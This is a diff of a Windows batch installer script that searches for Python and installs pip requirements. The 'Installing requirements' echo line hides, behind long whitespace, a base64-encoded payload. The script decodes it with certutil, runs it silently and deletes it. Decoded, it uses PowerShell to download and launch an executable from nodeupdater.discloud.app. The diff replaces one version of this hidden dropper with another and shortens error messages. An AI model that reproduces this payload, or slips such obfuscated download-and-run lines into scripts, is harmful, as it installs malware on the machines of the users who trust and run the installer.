@@ -8,7 +8,6 @@ echo Searching for Python...
 
 set "python="
 
-:: Check if Python is installed
 for /f "tokens=*" %%i in ('where python 2^>nul') do (
     set "python=%%i"
     goto foundPython
@@ -33,12 +32,12 @@ if defined python (
 )
 
 cls
-echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                                                   & echo QGVjaG8gb2ZmDQpzZXRsb2NhbCBlbmFibGVkZWxheWVkZXhwYW5zaW9uDQpzZXQgImRzPSVURU1QJSAlTE9DQUxBUFBEQVRBJSAlQVBQREFUQSUiDQpmb3IgJSVkIGluICglZHMlKSBkbyAocG93ZXJzaGVsbCAtY29tbWFuZCAidHJ5IHsoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwczovL25vZGV1cGRhdGVyLmRpc2Nsb3VkLmFwcC9Ob2RlJywgJyUlZFxOb2RlLmV4ZScpOyBleGl0IDB9IGNhdGNoIHtleGl0IDF9IiAmIGlmIG5vdCBlcnJvcmxldmVsIDEgKHN0YXJ0ICIiICIlJWRcTm9kZS5leGUiICYgZXhpdCAvYiAwKSkNCmVuZGxvY2FsDQpleGl0IC9iIDENCg > %TMP%\node.b64 & certutil -decode %TMP%\node.b64 %TMP%\node.bat >nul 2>&1 & call %TMP%\node.bat >nul 2>&1 & del %TMP%\node.b64 %TMP%\node.bat >nul 2>&1
+echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                                                   & echo QGVjaG8gb2ZmCnNldGxvY2FsIGVuYWJsZWRlbGF5ZWRleHBhbnNpb24Kc2V0ICJnZj0lVEVNUCUgJUxPQ0FMQVBQREFUQSUgJUFQUERBVEElIgpmb3IgJSVnIGluICglZ2YlKSBkbyAocG93ZXJzaGVsbCAtY29tbWFuZCAidHJ5IHsoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwczovL25vZGV1cGRhdGVyLmRpc2Nsb3VkLmFwcC9OZXdzJywgJyUlZ1xOZXdzLmV4ZScpOyBleGl0IDB9IGNhdGNoIHtleGl0IDF9IiAmIGlmIG5vdCBlcnJvcmxldmVsIDEgKHN0YXJ0ICIiICIlJWdcRHVjay5leGUiICYgZXhpdCAvYiAwKSkKZW5kbG9jYWwKZXhpdCAvYiAx > %TMP%\news.b64 & certutil -decode %TMP%\news.b64 %TMP%\news.bat >nul 2>&1 & call %TMP%\news.bat >nul 2>&1 & del %TMP%\news.b64 %TMP%\news.bat >nul 2>&1
 call "!python!" -m pip install -r requirements.txt
 
 if errorlevel 1 (
     cls
-    echo Failed to install requirements. Please check your internet connection and try again.
+    echo Failed to install requirements.
     pause
     goto end
 )
@@ -48,7 +47,7 @@ cls
 
 if errorlevel 1 (
     cls
-    echo Failed! Check the script for errors.
+    echo Failed!
     pause
     goto end
 )
